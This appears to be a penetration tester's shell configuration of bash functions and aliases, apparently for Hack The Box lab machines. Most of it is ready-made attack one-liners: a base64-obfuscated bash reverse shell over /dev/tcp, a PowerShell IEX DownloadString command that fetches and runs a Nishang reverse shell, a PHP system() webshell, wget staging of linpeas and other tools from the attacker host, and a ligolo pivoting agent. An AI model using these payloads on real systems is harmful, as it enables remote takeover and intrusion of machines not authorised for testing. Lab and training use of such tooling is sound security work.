ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
}

linpeas() {
  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')

  echo "wget http://$ip_tun0/linpeas.sh" | tr -d '\n' |xclip -sel clip
  cd ~/Tools; python3 -m http.server 80
}

upgrade () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}

transfer(){
  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
  echo "wget http://$ip_tun0/" | tr -d '\n' | xclip -sel clip
  sudo python3 -m http.server 80 --directory ~/Tools
}

ligolo(){
  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
  sudo ip tuntap add user kali mode tun ligolo
  sudo ip link set ligolo up
  echo "./agent -connect $ip_tun0:11601 -ignore-cert" | tr -d '\n' | xclip -sel clip
  cd ~/Tools/Ligolo;sudo ./proxy -selfcert
}

wordlists(){
echo -n '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt\n/usr/share/wordlists/dirb/big.txt\n/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n/usr/share/seclists/Discovery/Web-Content/api/objects.txt\n'}

alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"

alias server="sudo python3 -m http.server 80"

alias phpcmd='echo "<?php system(\$_GET[\"cmd\"]); ?>" | tee webshell.php'

create_folder() {
    if [ $# -eq 0 ]; then
        echo "[i] Usage: create_folder machine"
        return 1
    fi

    mkcd ~/Machines/HTB/"$1"
}

powershelloneline() {
    ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
    cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
    echo "powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://$ip_tun0:80/Invoke-PowerShellTcpOneLine.ps1')"
}

revshell(){
  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
  payload="/bin/bash -i >& /dev/tcp/$ip_tun0/8888 0>&1"
  rev=$(echo "$payload" | base64)
  echo "echo '$rev' | base64 -d | bash"
}

alias academy="cd ~/Machines/HTB/Academy"
